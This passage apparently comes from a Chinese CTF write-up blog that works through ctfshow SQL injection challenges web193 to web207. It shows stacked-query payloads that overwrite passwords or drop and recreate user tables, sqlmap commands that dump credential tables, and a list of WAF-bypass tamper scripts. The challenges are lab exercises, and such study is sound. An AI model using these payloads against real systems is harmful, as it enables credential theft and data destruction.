ascii(‘bc’)=97<br>mid和strsub效果一样,代码同上<br>这是一种解法，还可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and ((left((select database()),&#123;&#125;)=&#x27;</span>&#123;&#125;<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure><h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><p>left和right被滤掉了<br>还能用mid。<br>上题相同脚本即可。</p><h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h3 id="堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字"><a href="#堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字" class="headerlink" title="堆叠注入 a=0匹配所有开头不是数字或者为0的字符串和数字"></a>堆叠注入 <strong>a=0匹配所有开头不是数字或者为0的字符串和数字</strong></h3><blockquote><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p></blockquote><p>什么是堆叠注入，我一听这名字也懵了一下，查了一下，就是末尾加<code>；</code>链接下一个命令语句。使其一起执行。<br>空格被过滤了，可以用反引号执行。<br>题目里提示说登陆成功即可得到flag，那么将数据的密码切换为自己的密码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="number">0</span>]==$password)&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is $flag&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于sql的知识就是一坨，还是先查了一下写法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name</span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>因此可以写出payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br><span class="line">然后上传</span><br><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>就会返回flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689160962992-9e51c7f1-4f6c-428c-ba4f-5a04d65443df.png" alt="image.png"><br><strong>（username=0这个做法在web188中有提到，就是匹配所有开头不是数字或者为0的字符串和数字0）</strong><br>或者，还可以：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x61646d696e</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">然后账号<span class="number">0x61646d696e</span>和密码<span class="number">123456</span></span><br></pre></td></tr></table></figure><h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p>限制了用户名长度。看了wp才发现，这里的select没被过滤。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689163102786-54c21ea0-9ae6-4f5c-bb7d-81ba8af98594.png" alt="image.png"><br>啊这<br>payload：<code>username=1;select(1)&amp;password=1</code>让select的值覆盖给需要比对的参数，然后再传入你需要的密码。</p><h1 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h1><h3 id="show-tables查看表名-drop-create删表和创建表-insert插入数据"><a href="#show-tables查看表名-drop-create删表和创建表-insert插入数据" class="headerlink" title="show tables查看表名 drop\create删表和创建表 insert插入数据"></a>show tables查看表名 drop\create删表和创建表 insert插入数据</h3><h2 id="方法一-show-tables"><a href="#方法一-show-tables" class="headerlink" title="方法一 show tables"></a>方法一 show tables</h2><p>show tables获取表名的结果集。<br>由题目可知，ctfshow_user在其中，我们只需要这样传值即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span>;<span class="keyword">show</span> tables<span class="operator">&amp;</span>password<span class="operator">=</span>ctfshow_user</span><br></pre></td></tr></table></figure><h2 id="方法二-删表-把他变成自己的样子"><a href="#方法二-删表-把他变成自己的样子" class="headerlink" title="方法二 删表 把他变成自己的样子"></a>方法二 删表 把他变成自己的样子</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">drop</span> <span class="keyword">table</span> ctfshow_user;<span class="keyword">create</span> <span class="keyword">table</span> ctfshow_user(`username` <span class="type">varchar</span>(<span class="number">100</span>),`pass` <span class="type">varchar</span>(<span class="number">100</span>));<span class="keyword">insert</span> ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后直接账号密码输入1和1即可<br>当然也可以直接insert插入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">insert</span>  ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">password:<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="SQL知识补充-drop、create、insert"><a href="#SQL知识补充-drop、create、insert" class="headerlink" title="SQL知识补充-drop、create、insert"></a>SQL知识补充-drop、create、insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> OBJECT_TYPE [IF <span class="keyword">EXISTS</span>] object_name;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `OBJECT_TYPE`：指定要删除的对象类型，如`<span class="keyword">TABLE</span>`（表）、`<span class="keyword">VIEW</span>`（视图）等。</span><br><span class="line"><span class="operator">-</span> `IF <span class="keyword">EXISTS</span>`（可选）：如果加上此选项，如果要删除的对象不存在，则不会引发错误。</span><br><span class="line"><span class="operator">-</span> `object_name`：指定要删除的对象的名称。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> OBJECT_TYPE object_name</span><br><span class="line">(</span><br><span class="line">    column1 data_type,</span><br><span class="line">    column2 data_type,</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `OBJECT_TYPE`：指定要创建的对象类型，如`<span class="keyword">TABLE</span>`（表）、`<span class="keyword">VIEW</span>`（视图）等。</span><br><span class="line"><span class="operator">-</span> `object_name`：指定要创建的对象的名称。</span><br><span class="line"><span class="operator">-</span> `column1 data_type, column2 data_type, ...`：指定对象的列及其数据类型。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, ...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2, ...);</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `table_name`：指定要插入数据的表的名称。</span><br><span class="line"><span class="operator">-</span> `column1, column2, ...`：指定要插入数据的列。</span><br><span class="line"><span class="operator">-</span> `value1, value2, ...`：指定要插入的值，与列一一对应。</span><br></pre></td></tr></table></figure><h1 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h1><p>继续用上题的insert插入即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">insert</span>  ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">password:<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="web199、web200"><a href="#web199、web200" class="headerlink" title="web199、web200"></a>web199、web200</h1><p>括号被禁用了，那就用那个show tables</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h3 id="sqlmapGET注入-referer"><a href="#sqlmapGET注入-referer" class="headerlink" title="sqlmapGET注入 referer"></a>sqlmapGET注入 referer</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">当前数据库</span><br><span class="line">参数：<span class="comment">--current-db</span></span><br><span class="line">返还当前连接的数据库。</span><br><span class="line"></span><br><span class="line">列举数据库表</span><br><span class="line">参数：<span class="comment">--tables,--exclude-sysdbs,-D</span></span><br><span class="line">当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</span><br><span class="line">如果你不提供<span class="operator">-</span>D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</span><br><span class="line"><span class="comment">--exclude-sysdbs参数是指包含了所有的系统数据库。</span></span><br><span class="line">需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</span><br><span class="line"></span><br><span class="line">列举数据库表中的字段</span><br><span class="line">参数：<span class="comment">--columns,-C,-T,-D</span></span><br><span class="line">当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</span><br><span class="line">如果没有使用<span class="operator">-</span>D参数指定数据库时，默认会使用当前数据库。</span><br><span class="line"></span><br><span class="line">获取整个表的数据</span><br><span class="line">参数：<span class="comment">--dump,-C,-T,-D,--start,--stop,--first,--last</span></span><br><span class="line">如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</span><br><span class="line">使用<span class="operator">-</span>D,<span class="operator">-</span>T参数指定想要获取哪个库的哪个表，不适用<span class="operator">-</span>D参数时，默认使用当前库。</span><br></pre></td></tr></table></figure><p>payload：<code>sqlmap -u http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/api/\?id\=1 --refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</code><br>返回出：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166554462-4a3c7438-52d5-4b6d-b87d-910192d93e48.png" alt="image.png"><br>然后用payload爆表爆词条<br>爆库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166695514-becf0b5a-ebd9-4e7f-a93f-08e61f61a372.png" alt="image.png"><br>爆表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php -D ctfshow_web --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166764719-0fee533f-e0a8-4971-bd2d-a8ea49d132f4.png" alt="image.png"><br>爆词条</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166806079-e9066b90-185d-4eee-a837-3c79ea26c08c.png" alt="image.png"><br>查看字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162</span></span><br><span class="line"><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>sqlmap.php <span class="operator">-</span>D ctfshow_web <span class="operator">-</span>T ctfshow_user <span class="operator">-</span>C id,pass,username <span class="comment">--dump</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166915916-68f13c0c-13e8-47fd-90f4-fe5f87d32ff1.png" alt="image.png"></p><h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h3 id="sqlmapPOST注入-注意–referer和–data"><a href="#sqlmapPOST注入-注意–referer和–data" class="headerlink" title="sqlmapPOST注入 注意–referer和–data"></a>sqlmapPOST注入 注意–referer和–data</h3><p>抓包用的虽然是get，但是提示说是用post传参。<br>那就用post试一下。<br>我不理解这个referer的ctf.show是怎么确定的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>c3420367<span class="number">-21</span>b9<span class="number">-4692</span><span class="number">-8570</span><span class="number">-1</span>ac73fb7a651.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span> <span class="comment">--data=&#x27;id=1&#x27; --refer=&#x27;ctf.show&#x27; --dbs</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://c3420367-21b9-4692-8570-1ac73fb7a651.challenge.ctf.show/api/ --data=<span class="string">&#x27;id=1&#x27;</span> --referer=<span class="string">&#x27;ctf.show&#x27;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689168116809-aecb017b-30da-4d98-8cf2-62ae2e821ebf.png" alt="image.png"></p><h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h3 id="–method-切换方式-PUT请求"><a href="#–method-切换方式-PUT请求" class="headerlink" title="–method 切换方式 PUT请求"></a>–method 切换方式 PUT请求</h3><p>提示–method切换方式，使用PUT方法，需要加上Content-Type头，否则会变成表单提交：<br>我真的不太理解，这里为什么相同参数 我的就不行，wp的就可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://3c00342b-19a7-4a23-aa48-e84c36c5bcef.challenge.ctf.show/api/index.php --refer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1</span></span><br><span class="line"><span class="string">&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><p>PUT请求的工作原理如下：</p><ol><li><p>客户端发送PUT请求到服务器，并指定要更新的资源的URI（统一资源标识符）。</p></li><li><p>服务器收到PUT请求后，会检查请求头中的Content-Type字段来确定接收的数据格式。</p></li><li><p>服务器根据请求中提供的数据更新对应的资源。如果资源不存在，服务器可能会根据请求中的数据创建新的资源。</p></li><li><p>服务器返回HTTP响应码，指示PUT请求的处理结果。</p><h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><h3 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h3><p>先抓包获取cookie参数：<br><code>PHPSESSID=5mb3tupsgnxxxxxx; ctfshow=07cxxxxxxxxx</code><br>然后构建payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://087527a8-18dc-4e85-984e-4f9a39590671.challenge.ctf.show/api/index.php --refer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=5mb3xxxxq7ajmjalma2rc; ctfshow=07cdfa7549bc3cxxx9edxxxxxxea&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h3 id="api鉴权-–safe-url-–safe-freq"><a href="#api鉴权-–safe-url-–safe-freq" class="headerlink" title="api鉴权 –safe-url –safe-freq"></a>api鉴权 –safe-url –safe-freq</h3><p>每次查询请求可以注意到都会访问目标网页：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689169274466-380ecb13-009d-4bdd-a657-ee7081adc43b.png" alt="image.png"><br>需要以下两个参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line">--safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx,<span class="built_in">id</span>,tes --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><h3 id="–level-5"><a href="#–level-5" class="headerlink" title="–level=5"></a>–level=5</h3><p>提示说sql需要闭合，<br>打不出来可以使用更高的LEVEL调用更多的payload。<br>其实都不用提高等级，sqlmap低level就可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump --batch</span><br></pre></td></tr></table></figure><h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h3 id="tamper的编写-常见tamper脚本"><a href="#tamper的编写-常见tamper脚本" class="headerlink" title="tamper的编写 常见tamper脚本"></a>tamper的编写 常见tamper脚本</h3><p>首先看过滤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line">   <span class="built_in">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>常用tamper脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">举例如下tamper脚本：</span><br><span class="line"></span><br><span class="line">apostrophemask.py 用utf8代替引号</span><br><span class="line"></span><br><span class="line">equaltolike.py MSSQL * SQLite中like 代替等号</span><br><span class="line"></span><br><span class="line">greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号</span><br><span class="line"></span><br><span class="line">space2hash.py 空格替换为<span class="comment">#号 随机字符串 以及换行符 </span></span><br><span class="line"></span><br><span class="line">space2comment.py 用/**/代替空格</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br><span class="line"></span><br><span class="line">space2morehash.py MySQL中空格替换为 <span class="comment">#号 以及更多随机字符串 换行符</span></span><br><span class="line"></span><br><span class="line">appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py mssql空格替换为其它空符号</span><br><span class="line"></span><br><span class="line">base64encode.py 用<span class="built_in">base64</span>编码</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py mssql查询中替换空格</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py mysql中空格替换其它空白符号</span><br><span class="line"></span><br><span class="line">between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br><span class="line"></span><br><span class="line">space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br><span class="line"></span><br><span class="line">multiplespaces.py 围绕SQL关键字添加多个空格</span><br><span class="line"></span><br><span class="line">space2plus.py 用+替换空格</span><br><span class="line"></span><br><span class="line">bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable <span class="keyword">for</span>替代</span><br><span class="line"></span><br><span class="line">space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br><span class="line"></span><br><span class="line">sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py 双url编码(不处理以编码的)</span><br><span class="line"></span><br><span class="line">unionalltounion.py 替换UNION ALL SELECT UNION SELECT</span><br><span class="line"></span><br><span class="line">charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；</span><br><span class="line"></span><br><span class="line">randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写</span><br><span class="line"></span><br><span class="line">unmagicquotes.py 宽字符绕过 GPC addslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py 用/**/分割sql关键字</span><br><span class="line"></span><br><span class="line">charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码</span><br><span class="line"></span><br><span class="line">securesphere.py 追加特制的字符串</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py MySQL &gt;= 5.1.13注释绕过</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释</span><br><span class="line"></span><br><span class="line">space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’</span><br></pre></td></tr></table></figure><p>比如说这里过滤了空格，就可以使用space2comment.py文件<br>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show/api/index.php --data=<span class="string">&quot;id=1&quot;</span> --refer=<span class="string">&quot;ctf.show&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --safe-url=<span class="string">&quot;http://1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span><br></pre></td></tr></table></figure><h2 id="如何写自己的tamper脚本"><a href="#如何写自己的tamper脚本" class="headerlink" title="如何写自己的tamper脚本"></a>如何写自己的tamper脚本</h2><p><a href="https://www.wlhhlc.top/posts/14827">https://www.wlhhlc.top/posts/14827</a> 参考这个佬学会的<br>我们打开space2comment.py 修改（文件在<code>/usr/share/sqlmap/tamper</code>下）<br>我们编辑脚本，并将其中的<code>/**/</code>修改为 <code>%09</code>来做到绕过空格。<br>新建一个space2comment2.py 然后将修改后的脚本粘贴进去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 